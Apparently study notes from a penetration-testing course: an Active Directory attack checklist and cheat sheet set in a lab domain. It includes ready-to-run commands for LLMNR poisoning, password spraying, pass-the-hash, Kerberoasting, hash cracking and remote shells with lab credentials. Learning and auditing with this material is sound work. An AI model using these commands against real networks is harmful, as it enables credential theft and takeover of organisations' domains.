# Active Directory Enumeration & Attacks Checklist

---

## Table of Contents
- [Phase 1: Initial Enumeration](#phase-1-initial-enumeration)
- [Phase 2: Sniffing out a Foothold](#phase-2-sniffing-out-a-foothold)
- [Phase 3: Digging Deeper](#phase-3-digging-deeper)
- [Phase 4: Kerberoasting](#phase-4-kerberoasting)
- [Phase 5: ACL Abuse Primer and DCSync](#phase-5-acl-abuse-primer-and-dcsync)
- [Phase 6: Finding Vulns, Misconfigs and More Access](#phase-6-finding-vulns-misconfigs-and-more-access)
- [Phase 7: Attacking AD Trusts - Child → Parent](#phase-7-attacking-ad-trusts-child--parent-trust)
- [Phase 8: Attacking AD Trusts - Cross-Forest](#phase-8-attacking-ad-trusts-cross-forest-trust-abuse)

# Additional AD Auditing Techniques

- [Active Directory Explorer](#Creating-an-AD-Snapshot-with-Active-Directory-Explorer)
- [PingCastle](#PingCastle)
- [Group3r](#Group3r)
- [ADRecon](#ADRecon)


## Cheatsheet
- [Initial Enumeration](#initial-enumeration)
- [LLMNR/NBT-NS Poisoning](#llmnrnbt-ns-poisoning)
- [Password Spraying & Password Policies](#password-spraying--password-policies)
- [Enumerating Security Controls](#enumerating-security-controls)
- [Credentialed Enumeration](#credentialed-enumeration)
- [Enumeration by Living Off the Land](#enumeration-by-living-off-the-land)
- [Transferring Files](#transferring-files)
- [Kerberoasting](#kerberoasting)
- [ACL Enumeration & Tactics](#acl-enumeration--tactics)
- [DCSync](#dcsync)
- [Privileged Access](#privileged-access)
- [NoPac](#nopac)
- [PrintNightmare](#printnightmare)
- [PetitPotam](#petitpotam)
- [Miscellaneous Misconfigurations](#miscellaneous-misconfigurations)
- [Group Policy Enumeration & Attacks](#group-policy-enumeration--attacks)
- [ASREPRoasting](#asreproasting)
- [Trust Relationships - Child → Parent Trusts](#trust-relationships---child--parent-trusts)
- [Trust Relationships - Cross-Forest](#trust-relationships---cross-forest)

---

## Phase 1: Initial Enumeration

**GOAL:** Gather information about the target environment

### Method 1: External Reconnaissance
- Finding info with OSINT tools or public-facing aspects of target

### Method 2: Initial Enumeration of the Domain
- **Identify Hosts** (with network-related tools): Passively listening to the network to understand what's happening
- **Identify Users** (brute tools): Find a way to establish a foothold in the domain by using credentials or shell
- **Identify Potential Vulns**: Gaining SYSTEM Access

**BEST-CASE/EXPECTED RESULT:** Gathered user/group info, identified hosts and critical services like Domain Controllers, and understanding naming schemes

---

## Phase 2: Sniffing out a Foothold

**GOAL:** Obtain valid cleartext credentials for a domain user account, establishing a foothold for credentialed enumeration

### Method 1: Attempt LLMNR & NBT-NS Poisoning

#### Linux Host
- LLMNR & NBT-NS poisoning with: `Responder` or `Metasploit` modules

#### Windows Host
- LLMNR & NBT-NS poisoning with `Inveigh`

**BEST-CASE/EXPECTED RESULT:** Captured hashes or even clear-text credentials, then try offline cracking with `Hashcat`

### Method 2: Password Spray

#### Step 1: Enumerating & Retrieving Password Policies
- **Linux host:** 
  - Try `crackmapexec` if granted a credential
  - Try `rpcclient` if has no credential
  - If `rpcclient` fails, try `enum4linux` and `enum4linux-ng`
  - Additional try with `LDAP Anonymous Bind`
- **Windows host:** 
  - Start with null session by using `net use`
  - If granted a credential, try built-in tools like `net.exe`, `PowerView`

#### Step 2: Making a Target User List
- **If not granted any credential, try SMB null session and LDAP anonymous:**
  - SMB NULL Session to Pull User List using tools: `enum4linux`, `rpcclient`, `crackmapexec`
  - Gathering Users with LDAP Anonymous: tools: `windapsearch` and `ldapsearch`
  - If above 2 tools fail, get a `list` then brute with `Kerbrute`
- **If granted credential:** Try `CrackMapExec` to find more users

#### Step 3: Internal Password Spraying
- **Linux host:** 
  - Try `rpcclient` with Bash one-liner for the attack
  - Or `Kerbrute` 
  - Or `crackmapexec`
  - Then, consider testing for Local Administrator Password Reuse issue
- **Windows host:** Try `DomainPasswordSpray.ps1` tool
- **(Case optional)** External Password Spraying

**BEST-CASE/EXPECTED RESULT:** A foothold in the domain

---

## Phase 3: Digging Deeper

**GOAL:** Assess host defenses, conduct deeper domain enumeration with reduced restrictions, and leverage native tools for "living off the land" operations

### Objective 1: Enumerating Security Controls

- Check `Windows Defender` status and implementations
- Check for `AppLocker`
- Check for `PowerShell Constrained Language Mode`
- Check for `LAPS`

### Objective 2: Credentialed Enumeration

With acquired foothold in the domain, dig for domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more.

#### Linux Host

- **Method 1:** `CrackMapExec` - Dig for domain users, groups, logged on users, shares
- **Method 2:** `SMBMap` - For enumerating SMB shares, access and recursive list of directories
- **Method 3:** `rpcclient` for more user enumeration
- **Method 4:** Interact with command line using `Psexec.py` or `wmiexec.py`
- **Method 5:** `Windapsearch` for more enumeration and Privileged Users
- **Method 6:** `Bloodhound.py` - Most impactful Active Directory security auditing tool (GUI, automation enum tool)

#### Windows Host

- **Method 1:** `ActiveDirectory PowerShell Module` - A built-in tool, used by admins, `available` if admin did not disable it. It can enumerate:
  - Domain Info
  - `ADUser` has SPN property
  - Trust Relationships
  - Groups info
  - Group membership
- **Method 2:** `PowerView` - Provides deep insight into domain security posture:
  - Domain User Information
  - Recursive Group Membership
  - Trust Enumeration
  - Testing for Local Admin Access
  - Finding Users With SPN Set
- **Method 3:** `SharpView`
- **Method 4:** Domain shares
- **Method 5:** `Snaffler` - Automation tool, recommended, must run from a domain-joined host or within a domain-user context
- **Method 6:** `Bloodhound` - Automation tool, recommended, GUI, OP

### Objective 3: (Case-Optional) Living Off the Land Checklist

When you can't upload your tools to target host

**BEST-CASE/EXPECTED RESULT:** Broad picture of the domain and potential issues, enumerated user accounts and can see that some are configured with `Service Principal Names`

---

## Phase 4: Kerberoasting

**GOAL:** Lateral movement and privilege escalation that targets Service Principal Name (SPN) accounts

**Requirements:** 
- Domain user credentials (cleartext credentials or NTLM hash) 
- OR a domain user shell 
- OR SYSTEM account

### Linux Host

- **Step 1:** Listing SPN Accounts with `GetUserSPNs.py` from `Impacket`
- **Step 2:** Pull specific or all TGS tickets
- **Step 3:** Cracking the Ticket Offline with Hashcat
- **Step 4:** Testing Authentication against a Domain Controller

### Windows Host

#### Method 1: Semi-Manual
Use `setspn.exe` tool to:
- Enumerate SPNs
- Target specific SPN `user accounts`
- Retrieve their ticket from memory with `mimikatz`
- Prepare and smuggle to attack host
- Crack it offline

#### Method 2: Automated / Tool-Based Route
Using `PowerView`:
- Use PowerView to Enumerate SPN Accounts
- Use PowerView to Target a Specific User
- Exporting All Tickets to a CSV File

#### Method 3: Using `Rubeus`
Faster and easier:
- First use Rubeus to gather some stats
- Target account and request tickets

**Note:** Check `A Note on Encryption Types` for cautious notices

**BEST-CASE/EXPECTED RESULT:** Have a set of (hopefully privileged) credentials, then use it to access and escalate more

---

## Phase 5: ACL Abuse Primer and DCSync

**GOAL:** Explore Common Abusable AD Permissions, exploit ACEs for access escalation and persistence

**Note:** This part only covers enumerating and leveraging 4 specific ACEs to highlight the power of ACL attacks

### Step 1: ACL Enumeration

#### Method 1: Enumerating ACLs with `PowerView`
- Perform targeted enumeration starting with a `user that we have control over`
- Dig in and see if this user has any interesting ACL rights that we could take advantage of
- Take note of `ObjectDN` and `ObjectSID` and `ObjectAceType` from the result
- Perform reverse search and mapping `guid value` to Look for Interesting Access

#### Method 2: Enumerating with Built-in Cmdlets
- (Commonly available on client systems) provides the same results without `PowerView`
- Use it to Create a List of Domain Users
- Combine with `for loop` to enumerate users
- Similar steps to `PowerView`
- Repeat with new accounts, groups, nested groups, etc. found

#### Method 3: Enumerating ACLs with BloodHound
- Use `SharpHound`, then upload to `BloodHound`
- In `BloodHound` GUI, set our own user as starting node
- Select `Node Info` → `Outbound Control Rights`

### Step 2: Abusing ACLs and Potential DCSync

- Depend on the result of Step 1
- DCSync possible if we can get control of an account with `Replicating Directory Changes` and `Replicating Directory Changes All` permissions
- Domain/Enterprise Admins and default domain administrators have these rights by default

**BEST-CASE/EXPECTED RESULT:** If chaining rights abused from ACL can result in `DCSync` success, it's a quick win; else, move on to next phase

---

## Phase 6: Finding Vulns, Misconfigs and More Access

**GOAL:** With a foothold in the domain, advance our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise

### Method 1: Privileged Access

- **Step 1:** Use `BloodHound` and/or `PowerView` to enumerate
- **Step 2:** Find access like: `RDP`, PowerShell remoting or `MSSQL server` with sysadmin accounts
- Also, take notice of the `Double Hop` problem

### Method 2: Bleeding Edge Vulns

- Take notice of trending vulnerabilities and try them out

### Method 3: Miscellaneous Misconfigurations

- Misconfiguration checklist
- Understanding misconfigurations can help us think outside the box and discover issues
- Or maybe even a quick win

**BEST-CASE/EXPECTED RESULT:** Additional vulnerabilities found, and more paths to take over AD

---

## Phase 7: Attacking AD Trusts - Child → Parent Trust

**GOAL:** Enumerating Trust Relationships of AD and potentially exploit them

### Step 1: Enumerate

- Use built-in module to enumerate trusts, or better with `PowerView` and/or `BloodHound` for more specific info
- Then, enumerate across the trusts, for example, look at all users in the child domain
- Use `netdom` to retrieve information about the domain, including a list of domain trusts, domain controllers, workstations, servers

### Step 2: Target SID History

#### On Windows - Method 1: Using Mimikatz

To perform this attack after compromising a child domain, we need the following:
- The KRBTGT hash for the child domain using Mimikatz
- The SID for the child domain with `Mimikatz` or `PowerView`
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain (`PowerView`)
- Use `mimikatz`, create Golden Ticket, then confirm access
- Perform `DCSync` attack

#### On Windows - Method 2: Using Rubeus

- Similar process to Mimikatz

#### On Linux - Method 1: Manual

Similar steps in Windows but different tools:
- Once we have complete control of the child domain, we can use `secretsdump.py` to `DCSync` and grab the NTLM hash for the KRBTGT account
- Performing SID Brute Forcing using `lookupsid.py`
- Grabbing the Domain SID & Attaching to Enterprise Admin's RID with `lookupsid.py`
- Constructing a Golden Ticket using `ticketer.py`
- Getting a SYSTEM shell using Impacket's `psexec.py`

#### On Linux - Method 2: Auto Tool

- Use `raiseChild.py`

**BEST-CASE/EXPECTED RESULT:** From child domain, take over parent domain

---

## Phase 8: Attacking AD Trusts - Cross-Forest Trust Abuse

**GOAL:** From a foothold in 1 domain, escalate in another domain that has Domain/Enterprise Admin privileges in both domains

## On Windows

Depending on the trust direction, we can perform Kerberos attacks such as `Kerberoasting` and `ASREPRoasting`

### Method 1: Kerberoasting

- **Step 1:** Enumerating Accounts for Associated SPNs (`PowerView`)
- **Step 2:** Check if member of the Domain Admins group in the target domain
- **Step 3:** Performing a Kerberoasting Attack
- **Step 4:** Crack with Hashcat

### Method 2: Admin Password Re-Use & Group Membership

- Bidirectional forest trust managed by admins from the same company. Crack 1 get 2.
- Use the `PowerView` function `Get-DomainForeignGroupMember` to enumerate groups with users that do not belong to the domain

### Method 3: SID History Abuse - Cross Forest

- Possible, similar to child-parent

## On Linux

### Method 1: Manual Cross-Forest Kerberoasting

To do this, we need credentials for a user that can authenticate into the other domain by using `GetUserSPNs.py` then crack offline

### Method 2: Hunting Foreign Group Membership with Bloodhound-python

---

# Additional AD Auditing Techniques

## Creating an AD Snapshot with Active Directory Explorer

`AD Explorer` (Sysinternal Suite) is an advanced AD viewer and editor for navigating AD databases, viewing object properties and attributes, editing permissions, viewing schemas, and executing sophisticated searches. It can save AD database snapshots for offline viewing and perform before/after comparisons to identify changes in objects, attributes, and security permissions.

When we first load the tool, we are prompted for login credentials or to load a previous snapshot. We can log in with any valid domain user.

**Logging in with AD Explorer**
<img width="1010" height="528" alt="image" src="https://github.com/user-attachments/assets/20825480-c2f7-43ec-85e0-af76b2bedb4a" />

Once logged in, we can freely browse AD and view information about all objects.

**Browsing AD with AD Explorer**
<img width="1017" height="509" alt="image" src="https://github.com/user-attachments/assets/e83cf52a-1e6d-457e-a162-7d614df3d1d5" />

To take a snapshot of AD, go to File --> `Create Snapshot` and enter a name for the snapshot. Once it is complete, we can move it offline for further analysis.

**Creating a Snapshot of AD with AD Explorer**
<img width="1017" height="544" alt="image" src="https://github.com/user-attachments/assets/828497ee-2df6-4d01-9512-b6e6dc661dbc" />

---

## PingCastle

`PingCastle` evaluates AD security posture through maps and graphs, and can generate an active inventory of enterprise hosts. Unlike PowerView and BloodHound, it provides both enumeration data and a detailed security assessment report using a risk assessment/maturity framework based on Capability Maturity Model Integration (CMMI). Use `--help` for command options.

**Note:** If the tool won't start, set the system date before July 31, 2023 via Control Panel.

**Viewing the PingCastle Help Menu**
```
C:\htb> PingCastle.exe --help

switch:
  --help              : display this message
  --interactive       : force the interactive mode
  --log               : generate a log file
  --log-console       : add log to the console
  --log-samba <option>: enable samba login (example: 10)

Common options when connecting to the AD
  --server <server>   : use this server (default: current domain controller)
                        the special value * or *.forest do the healthcheck for all domains
  --port <port>       : the port to use for ADWS or LDAP (default: 9389 or 389)
  --user <user>       : use this user (default: integrated authentication)
  --password <pass>   : use this password (default: asked on a secure prompt)
  --protocol <proto>  : selection the protocol to use among LDAP or ADWS (fastest)
                      : ADWSThenLDAP (default), ADWSOnly, LDAPOnly, LDAPThenADWS

<SNIP>
```

**Running PingCastle**

To run PingCastle, we can call the executable by typing `PingCastle.exe` into our CMD or PowerShell window or by clicking on the executable, and it will drop us into interactive mode, presenting us with a menu of options inside the `Terminal User Interface` (TUI).

```
|:.      PingCastle (Version 2.10.1.0     1/19/2022 8:12:02 AM)
|  #:.   Get Active Directory Security at 80% in 20% of the time
# @@  >  End of support: 7/31/2023
| @@@:
: .#                                 Vincent LE TOUX (contact@pingcastle.com)
  .:       twitter: @mysmartlogon                    https://www.pingcastle.com
What do you want to do?
=======================
Using interactive mode.
Do not forget that there are other command line switches like --help that you can use
  1-healthcheck-Score the risk of a domain
  2-conso      -Aggregate multiple reports into a single one
  3-carto      -Build a map of all interconnected domains
  4-scanner    -Perform specific security checks on workstations
  5-export     -Export users or computers
  6-advanced   -Open the advanced menu
  0-Exit
==============================
This is the main functionnality of PingCastle. In a matter of minutes, it produces a report which will give you an overview of your Active Directory security. This report can be generated on other domains by using the existing trust links.
```

The default option is the `healthcheck` run, which will establish a baseline overview of the domain, and provide us with pertinent information dealing with misconfigurations and vulnerabilities. Even better, PingCastle can report recent vulnerability susceptibility, our shares, trusts, the delegation of permissions, and much more about our user and computer states. Under the Scanner option, we can find most of these checks.

```
|:.      PingCastle (Version 2.10.1.0     1/19/2022 8:12:02 AM)
|  #:.   Get Active Directory Security at 80% in 20% of the time
# @@  >  End of support: 7/31/2023
| @@@:
: .#                                 Vincent LE TOUX (contact@pingcastle.com)
  .:       twitter: @mysmartlogon                    https://www.pingcastle.com
Select a scanner
================
What scanner whould you like to run ?
WARNING: Checking a lot of workstations may raise security alerts.
  1-aclcheck                                                  9-oxidbindings
  2-antivirus                                                 a-remote
  3-computerversion                                           b-share
  4-foreignusers                                              c-smb
  5-laps_bitlocker                                            d-smb3querynetwork
  6-localadmin                                                e-spooler
  7-nullsession                                               f-startup
  8-nullsession-trust                                         g-zerologon
  0-Exit
==============================
Check authorization related to users or groups. Default to everyone, authenticated users and domain users
```

**Viewing The Report**

Throughout the report, there are sections such as domain, user, group, and trust information and a specific table calling out "anomalies" or issues that may require immediate attention. We will also be presented with the domain's overall risk score.

<img width="1141" height="846" alt="image" src="https://github.com/user-attachments/assets/7cc92ec5-2129-4259-9fa2-2b2288fdd520" />

---

## Group3r

`Group3r` is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy. Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using `runas /netonly`).

**Group3r Basic Usage**
```
C:\htb> group3r.exe -f <filepath-name.log> 
```

When running Group3r, we must specify the `-s` or the `-f` flag. These will specify whether to send results to stdout (-s), or to the file we want to send the results to (-f). For more options and usage information, utilize the `-h` flag, or check out the usage info. Example output:

**Reading Output**
<img width="1068" height="519" alt="image" src="https://github.com/user-attachments/assets/da4a77f6-7329-4806-8954-9ef1c673d498" />

When reading the output from Group3r, each indentation is a different level, so no indent will be the GPO, one indent will be policy settings, and another will be findings in those settings. Below we will take a look at the output shown from a finding.

<img width="905" height="799" alt="image" src="https://github.com/user-attachments/assets/b5df174f-c1d6-4145-8b86-5a54f916cf07" />

---

## ADRecon

In an assessment where stealth is not required, it is also worth running a tool like `ADRecon` and analyzing the results, just in case all of our enumeration missed something minor that may be useful to us or worth pointing out to our client.

**Running ADRecon**
```
PS C:\htb> .\ADRecon.ps1

[*] ADRecon v1.1 by Prashant Mahajan (@prashant3535)
[*] Running on INLANEFREIGHT.LOCAL\MS01 - Member Server
[*] Commencing - 03/28/2022 09:24:58
[-] Domain
[-] Forest
[-] Trusts
[-] Sites
[-] Subnets
[-] SchemaHistory - May take some time
[-] Default Password Policy
[-] Fine Grained Password Policy - May need a Privileged Account
[-] Domain Controllers
[-] Users and SPNs - May take some time
[-] PasswordAttributes - Experimental
[-] Groups and Membership Changes - May take some time
[-] Group Memberships - May take some time
[-] OrganizationalUnits (OUs)
[-] GPOs
[-] gPLinks - Scope of Management (SOM)
[-] DNS Zones and Records
[-] Printers
[-] Computers and SPNs - May take some time
[-] LAPS - Needs Privileged Account
[-] BitLocker Recovery Keys - Needs Privileged Account
[-] GPOReport - May take some time
[*] Total Execution Time (mins): 11.05
[*] Output Directory: C:\Tools\ADRecon-Report-20220328092458
```

Once done, ADRecon will drop a report for us in a new folder under the directory we executed from. We can see an example of the results in the terminal below.

```
PS C:\htb> ls

    Directory: C:\Tools\ADRecon-Report-20220328092458

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         3/28/2022  12:42 PM                CSV-Files
-a----         3/28/2022  12:42 PM        2758736 GPO-Report.html
-a----         3/28/2022  12:42 PM         392780 GPO-Report.xml
```

---

# Active Directory Enumeration & Attacks Cheat Sheet

---

## Initial Enumeration

| Command | Description |
|---------|-------------|
| `nslookup ns1.inlanefreight.com` | Query the domain name system and discover the IP address to domain name mapping of the target from a Linux-based host. |
| `sudo tcpdump -i ens224` | Start capturing network packets on the network interface proceeding the `-i` option on a Linux-based host. |
| `sudo responder -I ens224 -A` | Start responding to & analyzing LLMNR, NBT-NS and MDNS queries on the interface specified proceeding the `-I` option and operating in Passive Analysis mode which is activated using `-A`. Performed from a Linux-based host. |
| `fping -asgq 172.16.5.0/23` | Performs a ping sweep on the specified network segment from a Linux-based host. |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Performs an nmap scan with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN` option. Performed from a Linux-based host. |
| `sudo git clone https://github.com/ropnop/kerbrute.git` | Uses git to clone the kerbrute tool from a Linux-based host. |
| `make help` | List compiling options that are possible with make from a Linux-based host. |
| `sudo make all` | Compile a Kerbrute binary for multiple OS platforms and CPU architectures. |
| `./kerbrute_linux_amd64` | Test the chosen compiled Kerbrute binary from a Linux-based host. |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute` | Move the Kerbrute binary to a directory that can be set to be in a Linux user's path, making it easier to use the tool. |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc` using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. |

---

## LLMNR/NBT-NS Poisoning

| Command | Description |
|---------|-------------|
| `responder -h` | Display the usage instructions and various options available in Responder from a Linux-based host. |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses hashcat to crack NTLMv2 (`-m 5600`) hashes that were captured by responder and saved in a file (`forend_ntlmv2`). The cracking is done based on a specified wordlist. |
| `Import-Module .\Inveigh.ps1` | Using the Import-Module PowerShell cmd-let to import the Windows-based tool Inveigh.ps1. |
| `(Get-Command Invoke-Inveigh).Parameters` | Output many of the options & functionality available with Invoke-Inveigh. Performed from a Windows-based host. |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` | Starts Inveigh on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |
| `.\Inveigh.exe` | Starts the C# implementation of Inveigh from a Windows-based host. |
| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"` <br> `Get-ChildItem $regkey \| foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host. |

---

## Password Spraying & Password Policies

| Command | Description |
|---------|-------------|
| `#!/bin/bash` <br> `for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}` <br> `do echo $x; done` | Bash script used to generate 16,079,616 possible username combinations from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Uses CrackMapExec and valid credentials (avazquez:Password123) to enumerate the password policy (`--pass-pol`) from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5` | Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host. |
| `rpcclient $> querydominfo` | Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host. |
| `enum4linux -P 172.16.5.5` | Uses enum4linux to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host. |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight` | Uses enum4linux-ng to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` | Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host. |
| `net accounts` | Enumerate the password policy in a Windows domain from a Windows-based host. |
| `Import-Module .\PowerView.ps1` | Uses the Import-Module cmd-let to import the PowerView.ps1 tool from a Windows-based host. |
| `Get-DomainPolicy` | Enumerate the password policy in a target Windows domain from a Windows-based host. |
| `enum4linux -U 172.16.5.5 \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Uses enum4linux to discover user accounts in a target Windows domain, then leverages grep to filter the output to just display the user from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5` <br> `rpcclient $> enumdomuser` | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 --users` | Uses CrackMapExec to discover users (`--users`) in a target Windows domain from a Linux-based host. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "` | Uses ldapsearch to discover users in a target Windows domain, then filters the output using grep to show only the sAMAccountName from a Linux-based host. |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U` | Uses the python tool windapsearch.py to discover users in a target Windows domain from a Linux-based host. |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` | Bash one-liner used to perform a password spraying attack using rpcclient and a list of users (valid_users.txt) from a Linux-based host. It also filters out failed attempts to make the output cleaner. |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1` | Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Uses CrackMapExec and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using grep. |
| `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Uses CrackMapExec to validate a set of credentials from a Linux-based host. |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Uses CrackMapExec and the `--local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep. |
| `Import-Module .\DomainPasswordSpray.ps1` | Import the PowerShell-based tool DomainPasswordSpray.ps1 from a Windows-based host. |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Performs a password spraying attack and outputs (`-OutFile`) the results to a specified file (spray_success) from a Windows-based host. |

---

## Enumerating Security Controls

| Command | Description |
|---------|-------------|
| `Get-MpComputerStatus` | PowerShell cmd-let used to check the status of Windows Defender Anti-Virus from a Windows-based host. |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | PowerShell cmd-let used to view AppLocker policies from a Windows-based host. |
| `$ExecutionContext.SessionState.LanguageMode` | PowerShell script used to discover the PowerShell Language Mode being used on a Windows-based host. |
| `Find-LAPSDelegatedGroups` | A LAPSToolkit function that discovers LAPS Delegated Groups from a Windows-based host. |
| `Find-AdmPwdExtendedRights` | A LAPSToolkit function that checks the rights on each computer with LAPS enabled for any groups with read access and users with All Extended Rights. Performed from a Windows-based host. |
| `Get-LAPSComputers` | A LAPSToolkit function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host. |

---

## Credentialed Enumeration

| Command | Description |
|---------|-------------|
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid credentials. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | Authenticates with a Windows target over smb using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates with a Windows target over smb using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users` | Authenticates with a Windows target over smb using valid credentials and attempts to check for a list of logged on users (`--loggedon-users`) on the target Windows host. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` | Authenticates with a Windows target over smb using valid credentials and attempts to discover any smb shares (`--shares`). Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share` | Authenticates with a Windows target over smb using valid credentials and utilizes the CrackMapExec module (`-M`) spider_plus to go through each readable share (Dev-share) and list all readable files. The results are outputted in JSON. Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` | Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only` | Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (SYSVOL) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host. |
| `rpcclient $> queryuser 0x457` | Enumerates a target user account in a Windows domain using its relative identifier (0x457). Performed from a Linux-based host. |
| `rpcclient $> enumdomusers` | Discovers user accounts in a target Windows domain and their associated relative identifiers (RID). Performed from a Linux-based host. |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125` | Impacket tool used to connect to the CLI of a Windows target via the ADMIN$ administrative share with valid credentials. Performed from a Linux-based host. |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5` | Impacket tool used to connect to the CLI of a Windows target via WMI with valid credentials. Performed from a Linux-based host. |
| `windapsearch.py -h` | Display the options and functionality of windapsearch.py. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da` | Enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU` | Perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host. |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Executes the python implementation of BloodHound (bloodhound.py) with valid credentials and specifies a name server (`-ns`) and target Windows domain (inlanefreight.local) as well as runs all checks (`-c all`). Performed from a Linux-based host. |

---

## Enumeration by Living Off the Land

| Command | Description |
|---------|-------------|
| `Get-Module` | PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. |
| `Import-Module ActiveDirectory` | Loads the Active Directory PowerShell module from a Windows-based host. |
| `Get-ADDomain` | PowerShell cmd-let used to gather Windows domain information from a Windows-based host. |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by ServicePrincipalName. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *` | PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host. |
| `Get-ADGroup -Filter * \| select name` | PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host. |
| `Get-ADGroup -Identity "Backup Operators"` | PowerShell cmd-let used to search for a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Get-ADGroupMember -Identity "Backup Operators"` | PowerShell cmd-let used to discover the members of a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Export-PowerViewCSV` | PowerView script used to append results to a CSV file. Performed from a Windows-based host. |
| `ConvertTo-SID` | PowerView script used to convert a User or Group name to its SID. Performed from a Windows-based host. |
